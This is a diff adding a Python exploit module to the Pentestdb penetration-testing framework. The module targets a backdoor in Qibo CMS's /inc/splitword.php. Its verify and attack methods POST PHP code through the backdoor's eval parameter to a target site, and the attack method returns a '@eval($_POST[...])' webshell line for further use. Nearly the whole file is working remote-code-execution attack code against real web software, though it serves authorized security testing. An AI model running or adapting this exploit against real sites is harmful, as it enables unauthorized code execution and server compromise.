@@ -1,0 +1,58 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+'''
+Pentestdb, a database for penetration test.
+Copyright (c) 2015 alpha1e0
+'''
+
+
+from script.libs.exploit import Exploit
+from script.libs.exploit import Result
+
+
+
+class QibocmsBD(Exploit):
+    expName = u"齐博cms splitword.php 后门"
+    version = "1.0"
+    author = "alpha1e0"
+    language = "php"
+    appName = "qibocms"
+    appVersion = "1.0"
+    reference = ['http://www.wooyun.org/bugs/wooyun-2014-085038','http://www.wooyun.org/bugs/wooyun-2015-096380']
+    description = u'''
+        齐博cms
+    '''
+
+    def _verify(self):
+        result = Result(self)
+
+        phpPayload = "phpinfo();"
+        sig = '_SERVER["HTTP_HOST"]'
+
+        url = self.urlJoin("/inc/splitword.php")
+        response = self.http.post(url, data={'Y2hlbmdzaGlzLmMjd':phpPayload})
+
+        if response.status_code == 200:
+            if sig in response.content:
+                result['fullpath'] = self.url
+                result['payload'] = phpPayload
+
+        return result
+
+
+    def _attack(self):
+        result = Result(self)
+
+        phpPayload = "phpinfo();"
+        sig = '_SERVER["HTTP_HOST"]'
+
+        url = self.urlJoin("/inc/splitword.php")
+        response = self.http.post(url, data={'Y2hlbmdzaGlzLmMjd':phpPayload})
+
+        if response.status_code == 200:
+            if sig in response.content:
+                result['fullpath'] = url
+                result['payload'] = "@eval($_POST['Y2hlbmdzaGlzLmMjd']);"
+
+        return result
